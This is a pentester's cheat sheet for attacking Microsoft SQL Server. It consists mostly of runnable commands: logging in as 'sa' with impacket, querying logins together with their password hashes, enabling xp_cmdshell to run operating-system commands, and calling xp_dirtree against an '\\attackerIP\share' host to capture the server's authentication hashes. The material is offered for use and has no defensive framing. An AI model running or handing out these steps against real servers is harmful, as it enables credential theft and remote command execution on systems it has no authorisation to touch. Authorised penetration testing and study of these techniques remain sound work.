# pwning_mssql

#tools
#if you have a windows box u can use the SQL Management Studio (no really it's a good idea to take a look at this!)
# take a look at the msf modules, nmap sql modules
# also look at the sqlclient in impacket: mssqlclient.py -db db_sharepoint sa@192.168.1.10

#resources (this chap has made just an awesome collection of pwnage intel)
https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links


#get SQL version
select @@version

#find out who we are
select suser_name();
select name,sysadmin from syslogins;

#list all users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

#list all databases
SELECT name FROM master.sys.databases;
#change database
use Database_Name;

#list advanced options
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
#check what account is being used
EXEC master..xp_cmdshell 'whoami'

#steal hashes using xp_dirtree
xp_dirtree '\\attackerIP\share'
exec master.dbo.xp_dirtree '\\attackerIP\share'

#list all tables

SELECT * FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES;

#list all servers
select srvname, isremote from sysservers;

